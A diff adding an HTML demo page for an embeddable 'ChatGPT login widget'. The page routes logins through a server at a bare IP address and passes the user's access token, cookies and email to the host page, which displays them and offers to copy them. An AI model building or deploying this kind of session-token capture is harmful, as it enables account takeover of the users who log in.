@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ChatGPT Login Widget - Demo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 40px 20px;
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: white;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 2.5em;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+        .demo-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        @media (max-width: 1024px) {
+            .demo-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        .demo-card {
+            background: white;
+            border-radius: 12px;
+            padding: 25px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+        }
+        .demo-card h2 {
+            color: #2d3748;
+            margin-bottom: 10px;
+            font-size: 1.5em;
+        }
+        .demo-card .subtitle {
+            color: #718096;
+            margin-bottom: 20px;
+            font-size: 0.9em;
+        }
+        .widget-container {
+            background: #000;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        }
+        .desktop-widget {
+            height: 700px;
+        }
+        .mobile-widget {
+            height: 852px;
+            max-width: 393px;
+            margin: 0 auto;
+        }
+        .credentials {
+            background: #f7fafc;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 30px;
+            display: none;
+        }
+        .credentials.show {
+            display: block;
+        }
+        .credentials h2 {
+            color: #2d3748;
+            margin-bottom: 15px;
+            font-size: 1.5em;
+        }
+        .cred-item {
+            background: white;
+            padding: 12px;
+            margin-bottom: 10px;
+            border-radius: 6px;
+            border-left: 4px solid #667eea;
+        }
+        .cred-label {
+            font-weight: 600;
+            color: #4a5568;
+            font-size: 0.9em;
+            margin-bottom: 5px;
+        }
+        .cred-value {
+            font-family: 'Monaco', 'Courier New', monospace;
+            color: #2d3748;
+            word-break: break-all;
+            background: #f7fafc;
+            padding: 8px;
+            border-radius: 4px;
+            font-size: 0.85em;
+        }
+        .copy-btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+        .copy-btn:hover {
+            background: #5568d3;
+        }
+        .info {
+            background: #e6fffa;
+            border-left: 4px solid #38b2ac;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+        }
+        .info p {
+            color: #2c7a7b;
+            line-height: 1.6;
+            margin-bottom: 8px;
+        }
+        .info code {
+            background: #fff;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Monaco', monospace;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 ChatGPT Login Widget Demo</h1>
+        
+        <div class="info">
+            <p>
+                <strong>📱 Responsive Design:</strong> The widget automatically adapts to different screen sizes.
+                Test both desktop (left) and mobile (right) layouts below.
+            </p>
+            <p>
+                <strong>🔧 Integration:</strong> Use <code>ChatGPTLoginWidget.mount()</code> to embed in any website.
+                Dimensions are auto-detected from the container or can be set manually.
+            </p>
+        </div>
+
+        <div class="demo-grid">
+            <!-- Desktop Widget -->
+            <div class="demo-card">
+                <h2>💻 Desktop Mode</h2>
+                <div class="subtitle">Auto-detects container size (1920x1080)</div>
+                <div id="desktop-widget" class="widget-container desktop-widget"></div>
+            </div>
+
+            <!-- Mobile Widget -->
+            <div class="demo-card">
+                <h2>📱 Mobile Mode (iPhone 14 Pro)</h2>
+                <div class="subtitle">Manual dimensions (393x852)</div>
+                <div id="mobile-widget" class="widget-container mobile-widget"></div>
+            </div>
+        </div>
+
+        <div class="credentials" id="credentialsCard">
+            <h2>✅ Login Successful!</h2>
+            <div id="credentialsContent"></div>
+            <button class="copy-btn" onclick="copyAllCredentials()">📋 Copy All Credentials</button>
+        </div>
+    </div>
+
+    <script src="chatgpt-login-widget.js"></script>
+    <script>
+        let receivedCredentials = null;
+
+        // Mount desktop widget (auto-detects container size)
+        ChatGPTLoginWidget.mount('#desktop-widget', {
+            serverUrl: 'http://64.23.163.23:8080',
+            onCredentials: handleCredentials
+        });
+
+        // Mount mobile widget (manual iPhone dimensions)
+        ChatGPTLoginWidget.mount('#mobile-widget', {
+            serverUrl: 'http://64.23.163.23:8080',
+            width: 393,
+            height: 852,
+            onCredentials: handleCredentials
+        });
+
+        function handleCredentials(credentials) {
+            receivedCredentials = credentials;
+            console.log('✅ Received ChatGPT credentials!', credentials);
+            displayCredentials(credentials);
+        }
+
+        function displayCredentials(creds) {
+            const container = document.getElementById('credentialsContent');
+            const card = document.getElementById('credentialsCard');
+
+            let html = '';
+            
+            if (creds.accessToken) {
+                html += `
+                    <div class="cred-item">
+                        <div class="cred-label">Access Token</div>
+                        <div class="cred-value">${creds.accessToken}</div>
+                    </div>
+                `;
+            }
+            
+            if (creds.cookies) {
+                html += `
+                    <div class="cred-item">
+                        <div class="cred-label">Cookies</div>
+                        <div class="cred-value">${creds.cookies}</div>
+                    </div>
+                `;
+            }
+            
+            if (creds.session?.user?.email) {
+                html += `
+                    <div class="cred-item">
+                        <div class="cred-label">User Email</div>
+                        <div class="cred-value">${creds.session.user.email}</div>
+                    </div>
+                `;
+            }
+
+            container.innerHTML = html;
+            card.classList.add('show');
+            
+            // Scroll to credentials
+            card.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        }
+
+        function copyAllCredentials() {
+            if (!receivedCredentials) return;
+            
+            const text = JSON.stringify(receivedCredentials, null, 2);
+            navigator.clipboard.writeText(text).then(() => {
+                alert('✅ Credentials copied to clipboard!');
+            }).catch(err => {
+                console.error('Failed to copy:', err);
+                alert('❌ Failed to copy credentials');
+            });
+        }
+    </script>
+</body>
+</html>
+
